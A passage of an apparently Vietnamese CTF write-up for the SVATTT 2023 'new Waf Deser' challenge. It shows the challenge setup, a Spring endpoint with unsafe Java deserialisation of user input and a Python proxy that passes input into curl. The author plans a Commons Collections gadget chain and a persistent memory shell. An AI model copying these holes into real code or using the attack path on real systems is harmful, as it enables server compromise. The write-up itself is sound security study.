<!DOCTYPE html>
<html lang="vi-vn">
<head>
  <link rel="preload" href="/lib/font-awesome/webfonts/fa-brands-400.woff2" as="font" type="font/woff2" crossorigin="anonymous">
  <link rel="preload" href="/lib/font-awesome/webfonts/fa-regular-400.woff2" as="font" type="font/woff2" crossorigin="anonymous">
  <link rel="preload" href="/lib/font-awesome/webfonts/fa-solid-900.woff2" as="font" type="font/woff2" crossorigin="anonymous">
  <link rel="preload" href="/lib/JetBrainsMono/web/woff2/JetBrainsMono-Regular.woff2" as="font" type="font/woff2" crossorigin="anonymous">
  
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <title> SVATTT-2023 Ctf Writeup - The new Waf Deser | devme4f&#39;s blog</title>
  <link rel = 'canonical' href = 'https://devme4f.github.io/posts/2023/svattt-2023_new-waf-deser/'>
  
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <meta name="robots" content="all,follow">
  <meta name="googlebot" content="index,follow,snippet,archive">
  <meta property="og:title" content="SVATTT-2023 Ctf Writeup - The new Waf Deser" />
<meta property="og:description" content="Preface G√µ ph√≠m vi·∫øt b√†i n√†y th√¨ c≈©ng ƒë√£ g·∫ßn 2 th√°ng k·ªÉ t·ª´ ƒë·ª£t final A&amp;D SVATTT 2023 k·∫øt th√∫c. NƒÉm nay m√¨nh may may m·∫Øn ƒë∆∞·ª£c v√†o chung kh·∫£o ch∆°i A&amp;D v√† v·ªõi role l√† defense (c·∫•u h√¨nh log, patch bug,..etc). V√†o thi th√¨ kh√° lo·∫°n &#43; nhi·ªÅu vi·ªác, v√† v√¨ m√¨nh role defense n√™n c≈©ng ch·ªâ ng√≥ qua b√†i n√†y v√† th·∫•y backend y chang b√†i waf-deser nƒÉm tr∆∞·ªõc kh√°c m·ªói ph·∫ßn front-end, t∆∞·ªüng d·ªÖ n√™n m√¨nh v·∫´n ch∆∞a m√≤ l·∫°i xem, nay ƒë·∫øn deadline ho√†n th√†nh task ·ªü clb m·ªõi l·ª•i c·ª•i l√†m, th·∫•y hay n√™n write up l·∫°i lu√¥n, coi nh∆∞ l√†m t√†i li·ªáu tham kh·∫£o cho c√°c nƒÉm sau :D" />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://devme4f.github.io/posts/2023/svattt-2023_new-waf-deser/" /><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2023-12-22T12:35:17+07:00" />
<meta property="article:modified_time" content="2023-12-22T12:35:17+07:00" />

  <meta name="twitter:card" content="summary"/>
<meta name="twitter:title" content="SVATTT-2023 Ctf Writeup - The new Waf Deser"/>
<meta name="twitter:description" content="Preface G√µ ph√≠m vi·∫øt b√†i n√†y th√¨ c≈©ng ƒë√£ g·∫ßn 2 th√°ng k·ªÉ t·ª´ ƒë·ª£t final A&amp;D SVATTT 2023 k·∫øt th√∫c. NƒÉm nay m√¨nh may may m·∫Øn ƒë∆∞·ª£c v√†o chung kh·∫£o ch∆°i A&amp;D v√† v·ªõi role l√† defense (c·∫•u h√¨nh log, patch bug,..etc). V√†o thi th√¨ kh√° lo·∫°n &#43; nhi·ªÅu vi·ªác, v√† v√¨ m√¨nh role defense n√™n c≈©ng ch·ªâ ng√≥ qua b√†i n√†y v√† th·∫•y backend y chang b√†i waf-deser nƒÉm tr∆∞·ªõc kh√°c m·ªói ph·∫ßn front-end, t∆∞·ªüng d·ªÖ n√™n m√¨nh v·∫´n ch∆∞a m√≤ l·∫°i xem, nay ƒë·∫øn deadline ho√†n th√†nh task ·ªü clb m·ªõi l·ª•i c·ª•i l√†m, th·∫•y hay n√™n write up l·∫°i lu√¥n, coi nh∆∞ l√†m t√†i li·ªáu tham kh·∫£o cho c√°c nƒÉm sau :D"/>

  
  
    
  
  
  <link rel="stylesheet" href="https://devme4f.github.io/css/styles.a7dd5af4c7ef9f93fb31b1147bb343d14667fd6cdafa7ae17de8d923a2f6a282b9db99fd91500efb76d5de5a5603d29fb153733d9bfac95b534e595d0ab745a7.css" integrity="sha512-p91a9Mfvn5P7MbEUe7ND0UZn/Wza&#43;nrhfejZI6L2ooK525n9kVAO&#43;3bV3lpWA9KfsVNzPZv6yVtTTlldCrdFpw=="> 

  
  
  
    <!--[if lt IE 9]>
      <script src="https://oss.maxcdn.com/html5shiv/3.7.2/html5shiv.min.js"></script>
      <script src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>
    <![endif]-->
  

  
<link rel="icon" type="image/png" href="https://devme4f.github.io/images/favicon.ico" />

  
  
</head>

<body class="max-width mx-auto px3 ltr">
  <div class="content index py4">

  <div id="header-post">
  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;" aria-label="Top of Page"><i class="fas fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
         
        <li><a href="/">Home</a></li>
         
        <li><a href="/posts">Archives</a></li>
         
        <li><a href="/about">About</a></li>
        
      </ul>
    </span>
    <br/>
    <span id="actions">
      <ul>
        
        <li>
          <a class="icon" href=" https://devme4f.github.io/posts/2023/quick-note-spring-memshell/" aria-label="Previous">
            <i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i>
          </a>
        </li>
        
        
        <li>
          <a class="icon" href="https://devme4f.github.io/posts/2024/tetctf-2024_j4v4-censored/" aria-label="Next">
            <i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i>
          </a>
        </li>
        
        <li>
          <a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" aria-label="Top of Page">
            <i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i>
          </a>
        </li>
        <li>
          <a class="icon" href="#" aria-label="Share">
            <i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i>
          </a>
        </li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">Previous post</span>
      <span id="i-next" class="info" style="display:none;">Next post</span>
      <span id="i-top" class="info" style="display:none;">Back to top</span>
      <span id="i-share" class="info" style="display:none;">Share post</span>
    </span>
    <br/>
    <div id="share" style="display: none">
      
      <ul>
  
  
    
  
  
  <li>
    <a class="icon" href="http://www.facebook.com/sharer.php?u=https%3a%2f%2fdevme4f.github.io%2fposts%2f2023%2fsvattt-2023_new-waf-deser%2f" aria-label="Facebook">
      <i class="fab fa-facebook " aria-hidden="true"></i>
    </a>
  </li>
  <li>
    <a class="icon" href="https://twitter.com/share?url=https%3a%2f%2fdevme4f.github.io%2fposts%2f2023%2fsvattt-2023_new-waf-deser%2f&text=SVATTT-2023%20Ctf%20Writeup%20-%20The%20new%20Waf%20Deser" aria-label="Twitter">
      <i class="fab fa-twitter " aria-hidden="true"></i>
    </a>
  </li>
  <li>
    <a class="icon" href="http://www.linkedin.com/shareArticle?url=https%3a%2f%2fdevme4f.github.io%2fposts%2f2023%2fsvattt-2023_new-waf-deser%2f&title=SVATTT-2023%20Ctf%20Writeup%20-%20The%20new%20Waf%20Deser" aria-label="Linkedin">
      <i class="fab fa-linkedin " aria-hidden="true"></i>
    </a>
  </li>
  <li>
    <a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https%3a%2f%2fdevme4f.github.io%2fposts%2f2023%2fsvattt-2023_new-waf-deser%2f&is_video=false&description=SVATTT-2023%20Ctf%20Writeup%20-%20The%20new%20Waf%20Deser" aria-label="Pinterest">
      <i class="fab fa-pinterest " aria-hidden="true"></i>
    </a>
  </li>
  <li>
    <a class="icon" href="mailto:?subject=SVATTT-2023%20Ctf%20Writeup%20-%20The%20new%20Waf%20Deser&body=Check out this article: https%3a%2f%2fdevme4f.github.io%2fposts%2f2023%2fsvattt-2023_new-waf-deser%2f" aria-label="Email">
      <i class="fas fa-envelope " aria-hidden="true"></i>
    </a>
  </li>
  <li>
    <a class="icon" href="https://getpocket.com/save?url=https%3a%2f%2fdevme4f.github.io%2fposts%2f2023%2fsvattt-2023_new-waf-deser%2f&title=SVATTT-2023%20Ctf%20Writeup%20-%20The%20new%20Waf%20Deser" aria-label="Pocket">
      <i class="fab fa-get-pocket " aria-hidden="true"></i>
    </a>
  </li>
  <li>
    <a class="icon" href="http://reddit.com/submit?url=https%3a%2f%2fdevme4f.github.io%2fposts%2f2023%2fsvattt-2023_new-waf-deser%2f&title=SVATTT-2023%20Ctf%20Writeup%20-%20The%20new%20Waf%20Deser" aria-label="reddit">
      <i class="fab fa-reddit " aria-hidden="true"></i>
    </a>
  </li>
  <li>
    <a class="icon" href="http://www.tumblr.com/share/link?url=https%3a%2f%2fdevme4f.github.io%2fposts%2f2023%2fsvattt-2023_new-waf-deser%2f&name=SVATTT-2023%20Ctf%20Writeup%20-%20The%20new%20Waf%20Deser&description=Preface%20G%c3%b5%20ph%c3%adm%20vi%e1%ba%bft%20b%c3%a0i%20n%c3%a0y%20th%c3%ac%20c%c5%a9ng%20%c4%91%c3%a3%20g%e1%ba%a7n%202%20th%c3%a1ng%20k%e1%bb%83%20t%e1%bb%ab%20%c4%91%e1%bb%a3t%20final%20A%26amp%3bD%20SVATTT%202023%20k%e1%ba%bft%20th%c3%bac.%20N%c4%83m%20nay%20m%c3%acnh%20may%20may%20m%e1%ba%afn%20%c4%91%c6%b0%e1%bb%a3c%20v%c3%a0o%20chung%20kh%e1%ba%a3o%20ch%c6%a1i%20A%26amp%3bD%20v%c3%a0%20v%e1%bb%9bi%20role%20l%c3%a0%20defense%20%28c%e1%ba%a5u%20h%c3%acnh%20log%2c%20patch%20bug%2c..etc%29.%20V%c3%a0o%20thi%20th%c3%ac%20kh%c3%a1%20lo%e1%ba%a1n%20%2b%20nhi%e1%bb%81u%20vi%e1%bb%87c%2c%20v%c3%a0%20v%c3%ac%20m%c3%acnh%20role%20defense%20n%c3%aan%20c%c5%a9ng%20ch%e1%bb%89%20ng%c3%b3%20qua%20b%c3%a0i%20n%c3%a0y%20v%c3%a0%20th%e1%ba%a5y%20backend%20y%20chang%20b%c3%a0i%20waf-deser%20n%c4%83m%20tr%c6%b0%e1%bb%9bc%20kh%c3%a1c%20m%e1%bb%97i%20ph%e1%ba%a7n%20front-end%2c%20t%c6%b0%e1%bb%9fng%20d%e1%bb%85%20n%c3%aan%20m%c3%acnh%20v%e1%ba%abn%20ch%c6%b0a%20m%c3%b2%20l%e1%ba%a1i%20xem%2c%20nay%20%c4%91%e1%ba%bfn%20deadline%20ho%c3%a0n%20th%c3%a0nh%20task%20%e1%bb%9f%20clb%20m%e1%bb%9bi%20l%e1%bb%a5i%20c%e1%bb%a5i%20l%c3%a0m%2c%20th%e1%ba%a5y%20hay%20n%c3%aan%20write%20up%20l%e1%ba%a1i%20lu%c3%b4n%2c%20coi%20nh%c6%b0%20l%c3%a0m%20t%c3%a0i%20li%e1%bb%87u%20tham%20kh%e1%ba%a3o%20cho%20c%c3%a1c%20n%c4%83m%20sau%20%3aD" aria-label="Tumblr">
      <i class="fab fa-tumblr " aria-hidden="true"></i>
    </a>
  </li>
  <li>
    <a class="icon" href="https://news.ycombinator.com/submitlink?u=https%3a%2f%2fdevme4f.github.io%2fposts%2f2023%2fsvattt-2023_new-waf-deser%2f&t=SVATTT-2023%20Ctf%20Writeup%20-%20The%20new%20Waf%20Deser" aria-label="Hacker News">
      <i class="fab fa-hacker-news " aria-hidden="true"></i>
    </a>
  </li>
</ul>

    </div>
    
    <div id="toc">
      <nav id="TableOfContents">
  <ul>
    <li><a href="#preface">Preface</a></li>
    <li><a href="#docker-composeyml">docker-compose.yml</a></li>
    <li><a href="#de-old-backend">de old backend</a></li>
    <li><a href="#de-front">de front</a></li>
    <li><a href="#deser">deser</a></li>
    <li><a href="#anotherway-spring-view-manipulation-ssti-still-via-deser">Anotherway: Spring View Manipulation (SSTI) still, via deser</a></li>
  </ul>
</nav>
    </div>
    
  </span>
</div>


  <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
    <header>
      <h1 class="posttitle" itemprop="name headline">
        SVATTT-2023 Ctf Writeup - The new Waf Deser
      </h1>
      <div class="meta">
        
        <div class="postdate">
          
          <time datetime="2023-12-22 12:35:17 &#43;0700 &#43;07" itemprop="datePublished">2023-12-22</time>
          
        </div>
        
        
        
        
        <div class="article-tag">
            <i class="fas fa-tag"></i>
            
            
            <a class="tag-link" href="/tags/ctf" rel="tag">ctf</a>
            
             ,  
            <a class="tag-link" href="/tags/deser" rel="tag">deser</a>
            
        </div>
        
      </div>
    </header>

  
    
    <div class="content" itemprop="articleBody">
      <h2 id="preface">Preface</h2>
<p>G√µ ph√≠m vi·∫øt b√†i n√†y th√¨ c≈©ng ƒë√£ g·∫ßn 2 th√°ng k·ªÉ t·ª´ ƒë·ª£t final <code>A&amp;D SVATTT 2023</code> k·∫øt th√∫c. NƒÉm nay m√¨nh may may m·∫Øn ƒë∆∞·ª£c v√†o chung kh·∫£o ch∆°i A&amp;D v√† v·ªõi role l√† defense (c·∫•u h√¨nh log, patch bug,..etc). V√†o thi th√¨ kh√° lo·∫°n + nhi·ªÅu vi·ªác, v√† v√¨ m√¨nh role defense n√™n c≈©ng ch·ªâ ng√≥ qua b√†i n√†y v√† th·∫•y backend y chang b√†i <code>waf-deser</code> nƒÉm tr∆∞·ªõc kh√°c m·ªói ph·∫ßn front-end, t∆∞·ªüng d·ªÖ n√™n m√¨nh v·∫´n ch∆∞a m√≤ l·∫°i xem, nay ƒë·∫øn deadline ho√†n th√†nh task ·ªü clb m·ªõi l·ª•i c·ª•i l√†m, th·∫•y hay n√™n write up l·∫°i lu√¥n, coi nh∆∞ l√†m t√†i li·ªáu tham kh·∫£o cho c√°c nƒÉm sau :D</p>
<p>C≈©ng chia s·∫ª th√™m th√¨ b√†i n√†y trong ƒë·ª£t thi m√¨nh ch·ªâ th·∫•y 1 v√†i team l√† l√†m ƒë∆∞·ª£c, l√∫c ƒë·∫•y t·ª± h·ªèi sao ƒë·ªÅ y chang nƒÉm tr∆∞·ªõc, s·ª≠a m·ªói t√≠ l·∫°i √≠t solves th·∫ø. Nay xem kƒ© th√¨ m·ªõi th·∫•y d√π b√†i n√†y kh√¥ng qu√° kh√≥ nh∆∞ng ƒë·ªÉ build exploit ho√†n ch·ªânh th√¨ r·∫•t t·ªën time + b·∫≠n exploit ·ªü m·ªói round attack n·ªØa th√¨ r·∫•t kh√≥ ƒë·ªÉ ho√†n th√†nh.</p>
<p>Anyway, b·∫°n n√†o ch∆∞a ƒë·ªçc writeup b√†i <code>waf-deser</code> nƒÉm tr∆∞·ªõc th√¨ c√≥ th·ªÉ ƒë·ªçc writeup m√¨nh vi·∫øt tham kh·∫£o l·∫°i. M√¨nh c≈©ng s·∫Ω weaponize deser theo h∆∞·ªõng up spring memshell ƒë·ªÉ persistent ·ªü m·ªçi round thay v√¨ ch·ªâ ƒë·ªçc flag.</p>
<ul>
<li><strong>src web02</strong>: <a href="https://drive.google.com/file/d/1TGM4H8hTohidrnB7OWkEPf4iOOxL9juA/view?usp=sharing">https://drive.google.com/file/d/1TGM4H8hTohidrnB7OWkEPf4iOOxL9juA/view?usp=sharing</a></li>
<li><code>10.1.xx.93</code>: PUBLIC_IP</li>
<li><code>ubuntu.lab</code>: web02 address</li>
</ul>
<h2 id="docker-composeyml">docker-compose.yml</h2>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-yaml" data-lang="yaml"><span style="display:flex;"><span><span style="color:#f92672">services</span>:
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">front</span>:
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">build</span>: <span style="color:#ae81ff">./front</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">container_name</span>: <span style="color:#ae81ff">web2_front</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">networks</span>:
</span></span><span style="display:flex;"><span>      - <span style="color:#66d9ef">no</span>-<span style="color:#ae81ff">internet</span>
</span></span><span style="display:flex;"><span>      - <span style="color:#ae81ff">internet</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">ports</span>:
</span></span><span style="display:flex;"><span>      - <span style="color:#e6db74">&#34;8004:5000&#34;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">depends_on</span>: 
</span></span><span style="display:flex;"><span>      - <span style="color:#ae81ff">back</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">restart</span>: <span style="color:#ae81ff">always</span>
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">back</span>:
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">build</span>: <span style="color:#ae81ff">./back</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">container_name</span>: <span style="color:#ae81ff">web2_back</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">networks</span>:
</span></span><span style="display:flex;"><span>      - <span style="color:#66d9ef">no</span>-<span style="color:#ae81ff">internet</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">restart</span>: <span style="color:#ae81ff">always</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">networks</span>:
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">internet</span>: {}
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">no-internet</span>:
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">internal</span>: <span style="color:#66d9ef">true</span>
</span></span></code></pre></div><p>S∆° s∆° qua th√¨ file n√†y deploy 2 services, trong ƒë√≥ service <code>back</code> vs <code>front</code> n·∫±m c√πng network l√† <code>no-internet</code>, kh√¥ng c√≥ outbound ra network kh√°c. Ph·∫ßn <code>front</code> c√≥ expose port <code>8004</code> ƒë·ªÉ conect ƒë·∫øn ƒë∆∞·ª£c. √ù t∆∞·ªüng c≈©ng ch·ªâ c√≥ th·ªÉ l√† d√πng <code>front</code> ƒë·ªÉ exploit <code>back</code>!</p>
<h2 id="de-old-backend">de old backend</h2>
<p>Ph·∫ßn deser ·ªü <code>UserController</code> v·∫´n kh√° t∆∞∆°ng t·ª± nƒÉm ngo√°i:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#a6e22e">@RequestMapping</span><span style="color:#f92672">(</span>
</span></span><span style="display:flex;"><span>    value <span style="color:#f92672">=</span> <span style="color:#f92672">{</span><span style="color:#e6db74">&#34;/ticket/{info}&#34;</span><span style="color:#f92672">},</span>
</span></span><span style="display:flex;"><span>    method <span style="color:#f92672">=</span> <span style="color:#f92672">{</span>RequestMethod<span style="color:#f92672">.</span><span style="color:#a6e22e">GET</span><span style="color:#f92672">}</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">public</span> String <span style="color:#a6e22e">getUser</span><span style="color:#f92672">(</span><span style="color:#a6e22e">@PathVariable</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;info&#34;</span><span style="color:#f92672">)</span> String info<span style="color:#f92672">,</span> <span style="color:#a6e22e">@RequestParam</span><span style="color:#f92672">(</span>name <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;compress&#34;</span><span style="color:#f92672">,</span>defaultValue <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;false&#34;</span><span style="color:#f92672">)</span> Boolean isCompress<span style="color:#f92672">,</span> Model model<span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
</span></span><span style="display:flex;"><span>    String unencodedData <span style="color:#f92672">=</span> <span style="color:#66d9ef">this</span><span style="color:#f92672">.</span><span style="color:#a6e22e">unEncode</span><span style="color:#f92672">(</span>info<span style="color:#f92672">);</span>
</span></span><span style="display:flex;"><span>    String returnData <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">try</span> <span style="color:#f92672">{</span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">byte</span><span style="color:#f92672">[]</span> data <span style="color:#f92672">=</span> Base64<span style="color:#f92672">.</span><span style="color:#a6e22e">getMimeDecoder</span><span style="color:#f92672">().</span><span style="color:#a6e22e">decode</span><span style="color:#f92672">(</span>unencodedData<span style="color:#f92672">);</span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> <span style="color:#f92672">(</span>data<span style="color:#f92672">.</span><span style="color:#a6e22e">length</span> <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">2048</span><span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#34;common/error&#34;</span><span style="color:#f92672">;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">}</span> <span style="color:#66d9ef">else</span> <span style="color:#f92672">{</span>
</span></span><span style="display:flex;"><span>            User user <span style="color:#f92672">=</span> <span style="color:#66d9ef">null</span><span style="color:#f92672">;</span>
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> <span style="color:#f92672">(</span>isCompress<span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
</span></span><span style="display:flex;"><span>                InputStream is <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> GZIPInputStream<span style="color:#f92672">(</span><span style="color:#66d9ef">new</span> ByteArrayInputStream<span style="color:#f92672">(</span>data<span style="color:#f92672">));</span>
</span></span><span style="display:flex;"><span>                ObjectInputStream ois <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> ObjectInputStream<span style="color:#f92672">(</span>is<span style="color:#f92672">);</span>
</span></span><span style="display:flex;"><span>                user <span style="color:#f92672">=</span> <span style="color:#f92672">(</span>User<span style="color:#f92672">)</span>ois<span style="color:#f92672">.</span><span style="color:#a6e22e">readObject</span><span style="color:#f92672">();</span>
</span></span><span style="display:flex;"><span>            <span style="color:#f92672">}</span> <span style="color:#66d9ef">else</span> <span style="color:#f92672">{</span>
</span></span><span style="display:flex;"><span>                ObjectMapper objectMapper <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> ObjectMapper<span style="color:#f92672">();</span>
</span></span><span style="display:flex;"><span>                user <span style="color:#f92672">=</span> <span style="color:#f92672">(</span>User<span style="color:#f92672">)</span>objectMapper<span style="color:#f92672">.</span><span style="color:#a6e22e">readValue</span><span style="color:#f92672">(</span>data<span style="color:#f92672">,</span> User<span style="color:#f92672">.</span><span style="color:#a6e22e">class</span><span style="color:#f92672">);</span>
</span></span><span style="display:flex;"><span>            <span style="color:#f92672">}</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> <span style="color:#f92672">(</span>user <span style="color:#f92672">!=</span> <span style="color:#66d9ef">null</span><span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
</span></span><span style="display:flex;"><span>                model<span style="color:#f92672">.</span><span style="color:#a6e22e">addAttribute</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;user&#34;</span><span style="color:#f92672">,</span> user<span style="color:#f92672">);</span>
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">return</span> user<span style="color:#f92672">.</span><span style="color:#a6e22e">getRole</span><span style="color:#f92672">()</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;/welcome&#34;</span><span style="color:#f92672">;</span>
</span></span><span style="display:flex;"><span>            <span style="color:#f92672">}</span> <span style="color:#66d9ef">else</span> <span style="color:#f92672">{</span>
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#34;common/error&#34;</span><span style="color:#f92672">;</span>
</span></span><span style="display:flex;"><span>            <span style="color:#f92672">}</span>
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">}</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">}</span> <span style="color:#66d9ef">catch</span> <span style="color:#f92672">(</span>Exception var10<span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#34;common/error&#34;</span><span style="color:#f92672">;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">}</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">}</span>
</span></span></code></pre></div><p>Tuy nhi√™n ·ªü ƒë√¢y check th√™m ƒë·ªô d√†i payload sau khi gzip ch·ªâ ƒë∆∞·ª£c b√© h∆°n <code>2048</code>, n·∫øu l·ªõn h∆°n s·∫Ω kh√¥ng v√†o ph·∫ßn deser &ndash;&gt; failed. Exploit ch·ªó n√†y v·∫´n c√≥ th·ªÉ d√πng chain <code>CC4</code> ƒë·ªÉ deser (check file <code>pom.xml</code>) (th·∫ø th√¥i, ph·∫ßn d·ªÖ nh·∫•t üòÄüòÄ)</p>
<h2 id="de-front">de front</h2>
<p>Kh√¥ng c√≤n s·ª≠ d·ª•ng nginx m√† l√† 1 con web python nh∆∞ sau:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>FILTERED_HOSTS <span style="color:#f92672">=</span> [<span style="color:#e6db74">&#34;back&#34;</span>]
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>FILTERED_PATHS <span style="color:#f92672">=</span> [<span style="color:#e6db74">&#34;debug&#34;</span>, <span style="color:#e6db74">&#34;info&#34;</span>, <span style="color:#e6db74">&#34;ticket&#34;</span>]
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">//</span> truncated
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">@app.route</span>(<span style="color:#e6db74">&#34;/&lt;path:url&gt;&#34;</span>, methods<span style="color:#f92672">=</span>[<span style="color:#e6db74">&#34;GET&#34;</span>])
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">proxy</span>(url):
</span></span><span style="display:flex;"><span>    r <span style="color:#f92672">=</span> make_request(
</span></span><span style="display:flex;"><span>        str(url), request<span style="color:#f92672">.</span>method, dict(request<span style="color:#f92672">.</span>headers), request<span style="color:#f92672">.</span>get_data()
</span></span><span style="display:flex;"><span>    )
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> r
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">make_request</span>(url, method, headers<span style="color:#f92672">=</span>{}, data<span style="color:#f92672">=</span><span style="color:#66d9ef">None</span>):
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> is_approved(url):
</span></span><span style="display:flex;"><span>        abort(<span style="color:#ae81ff">403</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> <span style="color:#e6db74">&#34;curl/&#34;</span> <span style="color:#f92672">in</span> headers[<span style="color:#e6db74">&#34;User-Agent&#34;</span>]<span style="color:#f92672">.</span>lower():
</span></span><span style="display:flex;"><span>        abort(<span style="color:#ae81ff">403</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    curl_command <span style="color:#f92672">=</span> [<span style="color:#e6db74">&#34;curl&#34;</span>, <span style="color:#e6db74">&#34;-L&#34;</span>, <span style="color:#e6db74">&#34;-k&#34;</span>, <span style="color:#e6db74">&#34;-X&#34;</span>, method, url]
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> key, value <span style="color:#f92672">in</span> headers<span style="color:#f92672">.</span>items():
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> key<span style="color:#f92672">.</span>lower() <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;host&#34;</span> <span style="color:#f92672">or</span> key<span style="color:#f92672">.</span>lower() <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;user-agent&#39;</span>:
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">continue</span>
</span></span><span style="display:flex;"><span>        curl_command<span style="color:#f92672">.</span>extend([<span style="color:#e6db74">&#34;-H&#34;</span>, <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">{</span>key<span style="color:#e6db74">}</span><span style="color:#e6db74">: </span><span style="color:#e6db74">{</span>value<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>])
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> data:
</span></span><span style="display:flex;"><span>        curl_command<span style="color:#f92672">.</span>extend([<span style="color:#e6db74">&#34;--data&#34;</span>, data<span style="color:#f92672">.</span>decode()])
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">try</span>:
</span></span><span style="display:flex;"><span>        print(curl_command)
</span></span><span style="display:flex;"><span>        result <span style="color:#f92672">=</span> subprocess<span style="color:#f92672">.</span>run(
